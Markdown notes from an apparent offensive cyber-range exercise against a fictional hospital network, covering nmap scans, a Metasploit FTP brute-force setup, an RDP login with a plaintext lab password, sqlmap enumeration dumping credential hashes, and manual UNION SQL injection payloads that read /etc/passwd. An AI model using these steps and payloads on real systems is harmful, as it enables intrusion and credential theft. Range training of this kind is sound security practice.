# offensive cyber range armsdon-h notes

## domain controller

```bash

Host is up (0.00056s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: xxxxxx)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: ARMSDON)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ARMSDON
|   NetBIOS_Domain_Name: ARMSDON
|   NetBIOS_Computer_Name: EC2AMAZ-DFA8KLR
|   DNS_Domain_Name: armsdon.hospital.local
|   DNS_Computer_Name: EC2AMAZ-DFA8KLR.armsdon.hospital.local
|   Product_Version: 10.0.14393
|_  System_Time: 2022-08-13T22:47:37+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-DFA8KLR.armsdon.hospital.local
| Not valid before: 2022-08-12T20:54:20
|_Not valid after:  2023-02-11T20:54:20
|_ssl-date: 2022-08-13T22:48:17+00:00; 0s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=8/13%Time=62F82983%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");                                                                                                                                               
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                     
Device type: general purpose                                                                                                                                              
Running (JUST GUESSING): Microsoft Windows 2016 (89%), FreeBSD 6.X (85%)                                                                                                  
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2                                                                                                   
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)                                                                                     
No exact OS matches for host (test conditions non-ideal).                                                                                                                 
Network Distance: 2 hops                                                                                                                                                  
Service Info: Host: EC2AMAZ-DFA8KLR; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                           
                                                                                                                                                                          
Host script results:                                                                                                                                                      
|_clock-skew: mean: 0s, deviation: 2s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: EC2AMAZ-DFA8KLR
|   NetBIOS computer name: EC2AMAZ-DFA8KLR\x00
|   Domain name: armsdon.hospital.local
|   Forest name: armsdon.hospital.local
|   FQDN: EC2AMAZ-DFA8KLR.armsdon.hospital.local
|_  System time: xxxxxx
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: xxxxx
|_  start_date: xxxxx
```

> Once the hash of the domain administrator has been recovered, which of the following programs can be used to perform a Pass the Hash attack?

`pth-smbclient`

What is `pth-smbclient`?

---

## ftp server

<https://pentestlab.blog/2012/03/01/attacking-the-ftp-service/>

```bash
mfsconsole

search ftp_login

use auxiliary/scanner/ftp/ftp_login

show options

set RHOST XXXXX

find / 2>/dev/null | grep -i wordlist | grep unix
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt

set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

```

> What type of attack that allows privilege escalation is the FTP server vulnerable to?

`DLL Hijacking`

use auxiliary/scanner/portscan/syn

```bash
msf auxiliary(scanner/portscan/syn) > run

[+]  TCP OPEN 10.102xxxxx:3389
[+]  TCP OPEN 10.102xxxxx:5985
```

additional <https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp>

<https://www.kali.org/tools/rdesktop/>

```bash
rdesktop -u <username> <IP>

rdesktop -u douglas 10.102.10.50

Subject: CN=test-pc.armsdon.hospital.local
     Issuer: CN=test-pc.armsdon.hospital.local

rdesktop -d <domain> -u <username> -p <password> <IP>

rdesktop -d armsdon.hospital.local -u douglas -p '1m1ghtbwrong?' 10.102.10.50


```

---

## intranet

```bash
nmap -sS -sC -sV 10.Xxxxx
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-15 19:46 UTC                                                                     
Nmap scan report for ip-10-102-9-67.eu-west-1.compute.internal (10.XXXXX)
Host is up (0.000077s latency).                                                                                                            
Not shown: 999 closed ports                                                                                                                
PORT   STATE SERVICE VERSION                                                                                                                     
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: QualityCare
|_Requested resource was http://ip-10-XXXXXXXXXX.eu-west-1.compute.internal/login

```

```bash
sqlmap exploit

sqlmap --help

sqlmap -u ${URL} --batch --banner

back-end DBMS is MySQL
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.12
banner: '10.1.44-MariaDB-0ubuntu0.18.04.1'

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] qualitycare
```

`sqlmap -u URL --batch --passwords`

database management system users password hashes:

```bash
[*] root [1]:
    password hash: NULL
```

time-base blind attach is **SUPER SLOW**, so narrowing it down to a single DB, possible table and better limit to column as well

`sqlmap -u ${URL} --batch -D mysql --dump`

find available databases

`sqlmap -u ${URL} --batch --dbs`

find the tables in the specific database

`sqlmap -u ${URL} --batch -D mysql --tables`

`sqlmap -u ${URL} --batch -D qualitycare --tables`

```bash
Database: mysql
[30 tables]
+---------------------------+
| user                      |
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
+---------------------------+
```

find the columns on the specific table, on the specific database

`sqlmap -u ${URL} --batch -D mysql -T user --columns`

dump the selected values

`sqlmap -u ${URL} --batch -D mysql -T user -C User,Password --dump`

```bash
Database: mysql
Table: user
[1 entry]
+--------+-------------------------------------------+
| User   | Password                                  |
+--------+-------------------------------------------+
| root   | *4D4660866D8BB729116A6BBE5913441937DF1432 |
+--------+-------------------------------------------+
```

checking other databases and their tables

```bash
sqlmap -u ${URL} --batch -D qualitycare --tables

Database: qualitycare
[3 tables]
+-----------+
| hospitals |
| patients  |
| users     |
+-----------+
```

checking which columns we have in this specific table in this specific database

```bash
sqlmap -u ${URL} --batch -D qualitycare -T users --columns

Database: qualitycare
Table: users
[5 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| email       | varchar(75)  |
| hospital_id | int(11)      |
| id          | int(11)      |
| password    | varchar(255) |
| username    | varchar(75)  |
+-------------+--------------+
```

dump the selected values

`sqlmap -u ${URL} --batch -D qualitycare -T users -C email,hospital_id,id,password,username --dump`

```bash
Database: qualitycare
Table: users
[21 entries]
+-------------------------------------------+-------------+----+-----------------------+-------------------+
| email                                     | hospital_id | id | password              | username          |
+-------------------------------------------+-------------+----+-----------------------+-------------------+
(....)
(....)
(....)
+-------------------------------------------+-------------+----+-----------------------+-------------------+
```

checking other tables and columns

`sqlmap -u ${URL} --batch -D qualitycare -T hospitals --columns`

```bash
Database: qualitycare
Table: hospitals
[2 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| id     | int(11)      |
| name   | varchar(255) |
+--------+--------------+
```

* dump the selected values

`sqlmap -u ${URL} --batch -D qualitycare -T hospitals -C id,name --dump`

```bash
Database: qualitycare
Table: hospitals
[4 entries]
+----+-------------------+
| id | name              |
+----+-------------------+
| 1  | armsdon           |
| 2  | tadfield          |
| 3  | walmington-on-sea |
| 4  | fitton            |
+----+-------------------+
```

After login with valid user, we can see that is still possible to run a `SQL UNION` injection attack

```bash

' ORDER by 9 #

' UNION SELECT 1,2,3,4,5,6,7,8,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#

> hospitals,patients,users


' UNION SELECT 1,2,User,Password,5,6,7,8,9 FROM mysql.user WHERE user="root"#

' UNION SELECT 1,2,User,Password,5,6,7,8,9 FROM mysql.user#

' UNION SELECT 1,Password,User,4,5,6,7,8,9 FROM mysql.user WHERE user="root"#


additional info - https://resources.infosecinstitute.com/topic/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/

' UNION SELECT 1,user(),database(),version(),5,6,7,8,9 #

qualitycare
root@localhost 

session_user(),current_user():

version()

load_file(/etc/passwd)

' UNION SELECT 1,2,load_file(/etc/passwd),4,5,6,7,8,9 #    <--this might now work if the `load_file` is disabled on the server.

' UNION SELECT 1,current_user(),session_user(),4,5,6,7,8,9 #


```
